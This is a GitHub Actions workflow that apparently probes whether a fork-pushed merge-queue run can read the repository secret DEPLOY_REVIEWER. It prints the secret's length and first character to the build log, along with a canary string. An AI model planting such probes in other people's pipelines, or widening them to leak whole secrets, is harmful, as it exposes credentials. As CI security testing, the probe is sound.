name: Fork Secret Probe
on:
  push:
    branches:
      - "gh-readonly-queue/**"

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Fork canary with secret test
        env:
          HAS_SECRET: ${{ secrets.DEPLOY_REVIEWER != '' }}
          SECRET_VALUE: ${{ secrets.DEPLOY_REVIEWER }}
        run: |
          echo "FORK_CANARY: Fenna Kuipers INV-7248-873"
          echo "origin: toofikz2/public-test-repo-3 fork branch (fork-mq-attack)"
          echo "event: $GITHUB_EVENT_NAME"
          echo "ref: $GITHUB_REF"
          echo "sha: $GITHUB_SHA"
          echo "repository: $GITHUB_REPOSITORY"
          echo "has_secret: $HAS_SECRET"
          if [ -n "$SECRET_VALUE" ]; then
            echo "SECRET_LENGTH: ${#SECRET_VALUE}"
            echo "SECRET_FIRST_CHAR: ${SECRET_VALUE:0:1}"
          else
            echo "SECRET_VALUE: empty or unavailable"
          fi
